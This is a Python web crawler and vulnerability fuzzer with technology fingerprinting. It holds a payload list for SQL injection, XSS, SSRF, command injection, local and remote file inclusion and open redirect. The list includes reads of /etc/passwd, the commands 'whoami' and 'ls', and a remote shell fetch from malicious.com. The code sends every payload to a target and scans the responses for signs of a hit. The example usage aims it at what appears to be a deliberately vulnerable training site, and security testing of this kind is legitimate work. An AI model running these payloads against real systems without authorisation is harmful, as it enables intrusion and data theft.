import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

PAYLOADS = {
    "sql_injection": ["' OR '1'='1", """' UNION SELECT null, username, password FROM users--"""],
    "xss": ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"] ,
    "ssrf": ["http://localhost:8080/admin", "file:///etc/passwd"],
    "command_injection": ["; ls -la", "| whoami"],
    "lfi": ["../../../../etc/passwd", "../windows/win.ini"],
    "rfi": ["http://malicious.com/shell.txt"],
    "open_redirect": ["http://evil.com"]
}

class WebCrawler:
    def __init__(self, base_url, max_depth=2):
        self.base_url = base_url
        self.max_depth = max_depth
        self.visited_urls = set()
        self.discovered_urls = set()
        self.headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
            }

        self.technologies = {
            "server": None,
            "backend": None,
            "frontend": [],
            "cdn_libraries": []
        }

    def fetch_urls(self, url, depth=0):
        if depth > self.max_depth or url in self.visited_urls:
            return

        self.visited_urls.add(url)
        try:
            response = requests.get(url, headers=self.headers, timeout=5)
            if response.status_code != 200:
                return
        except requests.RequestException:
            return

        soup = BeautifulSoup(response.text.lower(), 'html.parser')
        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            if self.is_valid_url(full_url):
                self.discovered_urls.add(full_url)
                self.fetch_urls(full_url, depth + 1)

    def is_valid_url(self, url):
        parsed_url = urlparse(url)
        return parsed_url.netloc == urlparse(self.base_url).netloc

    def start_crawl(self):
        self.fetch_urls(self.base_url)
        return self.discovered_urls

    def send_fuzz_request(self, method='GET', headers=None, params=None, data=None, vulnerability_type=None):
        """Send an HTTP request with different payloads to test vulnerabilities."""
        results = []
        
        if vulnerability_type and vulnerability_type in PAYLOADS:
            payloads = PAYLOADS[vulnerability_type]
        else:
            payloads = [p for pl in PAYLOADS.values() for p in pl]
        
        if not headers: headers = self.headers
        
        for index, payload in enumerate(payloads):
            print(f"{index}/{len(payloads)}")
            try:
                # Modify params or data with the payload
                mod_params = {k: v + payload for k, v in (params or {}).items()} if params else None
                mod_data = {k: v + payload for k, v in (data or {}).items()} if data else None
                
                response = requests.request(method, self.base_url, headers=headers, params=mod_params, data=mod_data, timeout=5)

                analysis = self.analyze_response(response, payload)

                results.append({
                    "payload": payload,
                    "status_code": response.status_code,
                    "headers": dict(response.headers),
                    "response_text": response.text[:500],  # Limit response size for logs
                    "analysis": analysis
                })
            except Exception as e:
                results.append({"payload": payload, "error": str(e)})
        
        return results

    @staticmethod
    def analyze_response(response, payload):
        """Analyze HTTP response to identify potential vulnerabilities."""
        indicators = {
            "sql_injection": ["sql syntax", "mysql_fetch", "unclosed quotation mark"],
            "xss": ["<script>", "alert("],
            "ssrf": ["internal server error", "localhost", "private IP"],
            "command_injection": ["uid=", "gid="],
            "lfi": ["root:x", "[boot]", "boot.ini"],
            "rfi": ["malicious.com"],
            "open_redirect": ["Location: http://evil.com"]
        }

        findings = []

        for vuln_type, keywords in indicators.items():
            if any(keyword.lower() in response.text.lower() for keyword in keywords):
                findings.append({"vulnerability": vuln_type, "payload": payload, "indicator": keywords})

        return findings

    def detect_technologies(self):
        try:
            response = requests.get(self.base_url, timeout=10, headers=self.headers)
            headers = response.headers

            # Extract server details from headers
            if 'Server' in headers:
                self.technologies['server'] = headers['Server']
            if 'X-Powered-By' in headers:
                self.technologies['backend'] = headers['X-Powered-By']

            # Parse HTML content
            soup = BeautifulSoup(response.text, 'html.parser')

            # Detect meta tags revealing technology
            for meta in soup.find_all('meta'):
                if meta.get('name') == 'generator':
                    self.technologies['backend'] = meta.get('content')

            # Detect frontend libraries (JS frameworks)
            script_tags = soup.find_all('script', src=True)
            for script in script_tags:
                src = script['src']
                if 'jquery' in src:
                    self.technologies['frontend'].append('jQuery')
                elif 'react' in src:
                    self.technologies['frontend'].append('React')
                elif 'angular' in src:
                    self.technologies['frontend'].append('Angular')
                elif 'vue' in src:
                    self.technologies['frontend'].append('Vue.js')

                # Identify CDNs
                if any(domain in src for domain in ["cdn", "cloudflare", "googleapis", "jsdelivr"]):
                    self.technologies['cdn_libraries'].append(src)

        except requests.RequestException as e:
            print(f"Error fetching {self.base_url}: {e}")


# Example usage:
if __name__ == "__main__":
    import pprint
    target_url = "https://google-gruyere.appspot.com/"
    crawler = WebCrawler(target_url, max_depth=2)
    # urls = crawler.start_crawl()
    # print("Discovered URLs:", urls)
    res = crawler.send_fuzz_request()
    pprint.pprint(res)
